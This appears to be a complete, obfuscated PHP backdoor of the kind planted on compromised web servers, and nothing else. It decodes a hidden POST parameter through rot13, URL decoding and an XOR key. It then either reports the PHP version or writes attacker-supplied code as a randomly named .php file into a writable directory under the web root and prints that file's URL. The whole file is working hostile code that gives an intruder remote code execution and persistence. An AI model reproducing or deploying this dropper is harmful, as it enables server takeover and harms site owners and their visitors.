<?php $frkzvzxg = "svjvizffuddpqeoj";$mzpwgsie = "";foreach ($_POST as $nqcmg => $rhzhkvu){if (strlen($nqcmg) == 16 and substr_count($rhzhkvu, "%") > 10){lngjab($nqcmg, $rhzhkvu);}}function lngjab($nqcmg, $ctohqwtsi){global $mzpwgsie;$mzpwgsie = $nqcmg;$ctohqwtsi = str_split(rawurldecode(str_rot13($ctohqwtsi)));function rdftmtj($kwmat, $nqcmg){global $frkzvzxg, $mzpwgsie;return $kwmat ^ $frkzvzxg[$nqcmg % strlen($frkzvzxg)] ^ $mzpwgsie[$nqcmg % strlen($mzpwgsie)];}$ctohqwtsi = implode("", array_map("rdftmtj", array_values($ctohqwtsi), array_keys($ctohqwtsi)));$ctohqwtsi = @unserialize($ctohqwtsi);if (@is_array($ctohqwtsi)){$nqcmg = array_keys($ctohqwtsi);$ctohqwtsi = $ctohqwtsi[$nqcmg[0]];if ($ctohqwtsi === $nqcmg[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function znccdce($fcdghjir) {static $tbuviehnpb = array();$pmsizoj = glob($fcdghjir . '/*', GLOB_ONLYDIR);if (count($pmsizoj) > 0) {foreach ($pmsizoj as $fcdghj){if (@is_writable($fcdghj)){$tbuviehnpb[] = $fcdghj;}}}foreach ($pmsizoj as $fcdghjir) znccdce($fcdghjir);return $tbuviehnpb;}$ntphyc = $_SERVER["DOCUMENT_ROOT"];$pmsizoj = znccdce($ntphyc);$nqcmg = array_rand($pmsizoj);$zwjctx = $pmsizoj[$nqcmg] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($zwjctx, $ctohqwtsi);echo "http://" . $_SERVER["HTTP_HOST"] . substr($zwjctx, strlen($ntphyc));exit();}}}